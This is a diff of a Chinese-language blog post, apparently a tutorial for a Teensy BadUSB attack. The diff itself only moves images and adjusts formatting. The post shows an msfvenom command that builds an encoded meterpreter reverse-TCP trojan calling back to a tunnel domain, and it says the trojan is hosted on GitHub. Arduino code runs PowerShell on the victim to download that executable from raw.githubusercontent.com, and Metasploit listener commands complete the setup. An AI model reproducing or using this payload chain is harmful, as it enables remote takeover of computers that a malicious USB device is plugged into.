@@ -39,7 +39,7 @@ layut: post
  ⚡/home/da1sy# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b '\x00' lhost=free.idcfengye.com lport=17839 -f exe > windows.exe  
 ```
 **lhost** 为运行sunny后的域名，**lport**为开通隧道时填写的端口（运行后也会有显示）
-#### 最后将生成的木马放到github项目上实现远程下载
+#### **最后将生成的木马放到github项目上实现远程下载**
 ### 6.编辑arduino代码
 ```arduino
 char *command1 = "powershell -Command $clnt = new-object System.Net.WebClient;$url= 'https://raw.githubusercontent.com/da1sy/da1sy/master/windows.exe';$file = ' %HOMEPATH%\\windows.exe ';$clnt.DownloadFile($url,$file); ";
@@ -69,7 +69,6 @@ void omg(char *SomeCommand)
 #### 编辑好后点**验证**，然后插入**Teensy**板子，最后按一下板子上的按钮完成上传
 
 ### 7.metasploit开启监听
-![5](http://da1sy.github.io/assets/images/9-Yue/teensy-5.png)
 ```
 ⚡ /home/da1sy/# msfconsole
 
@@ -78,6 +77,7 @@ msf exploit(multi/handler) > set lhost 127.0.0.1
 msf exploit(multi/handler) > set lport 6666
 msf exploit(multi/handler) > exploit
 ```
+![5](http://da1sy.github.io/assets/images/9-Yue/teensy-5.png)
 ### 8.最后对目标插入badusb
 效果图如下
 ![6](http://da1sy.github.io/assets/images/9-Yue/teensy-s1.gif)
@@ -89,5 +89,5 @@ msf exploit(multi/handler) > exploit
 
 ### 一些其他的代码
 ```
-
+有时间再补
 ```
